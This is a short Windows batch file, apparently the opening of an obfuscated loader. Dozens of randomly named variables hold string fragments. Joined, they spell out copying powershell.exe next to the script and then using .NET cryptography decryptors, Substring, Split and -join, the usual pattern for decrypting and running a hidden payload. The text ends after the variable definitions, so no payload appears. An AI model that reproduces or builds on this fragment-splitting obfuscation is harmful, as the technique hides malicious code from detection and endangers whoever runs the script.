@echo off
set "rFtgeGQYHU=.e"
set "twxrPWhpCN=\v"
set "vDMhWQwvul=po"
set "nTNkhrRGWN=he"
set "qftzJMPuCO=ow"
set "OvYnhPZxvL=y "
set "OVUDchZasB=s\"
set "eouTUefozR=Sy"
set "HIOPnAmejl=nd"
set "IZwGIlLDQj=in"
set "TTCRdLNlNg=em"
set "bYdUxCPeZV=Po"
set "PBhDCXKLcf= /"
set "qUBtpCGEYt=do"
set "UsFHMpAOLb=0\"
set "ZzVtEJfgbv=co"
set "vsEAruFwNR=he"
set "kBejPuXUuE=we"
set "RfRNsKExBp=rS"
set "GAVKaxJPhS=\W"
set "HTiUOkrkqt=py"
set "WPNOzbRPEz=rs"
set "BlLIgcLzEE=32"
set "bYebLtnwRr=ll"
set "ZymRjstaMB= C"
set "riJvoLYBuy=we"
set "zYvZfsYSQG=ws"
set "YGRVPRWERv=xe"
set "qSzmyIoeFS=Wi"
set "MUeNsZvvqN=:\"
set "NrmewkyZDL=st"
set "MBEccroaKt=ll"
set "XrDJIxuznW=1."
set "AzDsdkfwru=cd"
set "FNSbNeRwJJ= %~dp0"
set "wIyeNIMoSJ=trea"
set "cXacugGCzk=pose"
set "lZpLpPyBMq=$yqP"
set "yOzEDWkJyr=.Dis"
set "UuhOJqjGdZ=.Cry"
set "pTMKxugtGn=raph"
set "IdCEqjVeAD=('da"
set "qjONOYhcXn=tsWi"
set "DvTyKpWIDq=ionM"
set "pNNaSxQVcm=ZuRf"
set "xKVDAUwEoq=jmn "
set "ypkTtQMVSY=[-1."
set "LWDcVEjRyr=.Ass"
set "llZgIiBsQP=rity"
set "VIvdbmsWdn=em.I"
set "WlXiyQfuxS=bstr"
set "qcrkeCtDWI=ptog"
set "oNNgpnaBmr=-Obj"
set "vQocVWDqQE=geNP"
set "ayJlyyVnxT=lit("
set "EWoaALILtY=, (,"
set "OYvhRZajIe=Mode"
set "YZSakCbMrI=pDZz"
set "AagwEBmBMa=oArr"
set "lnbRgLCfVo=[Sys"
set "HbleNZpBRi=; };"
set "ONjKZNDqrG=0O+g"
set "MTCPyppfkM=ateD"
set "fiWporqYDC=isfL"
set "KGFYymSjNx=pStr"
set "PQHpdokldN=y.Cr"
set "xGnSJyBEfm=-4] "
set "jcuYbTYHIy=6esa"
set "jrZcuSpBLo=-joi"
set "nrehxoUQgJ= New"
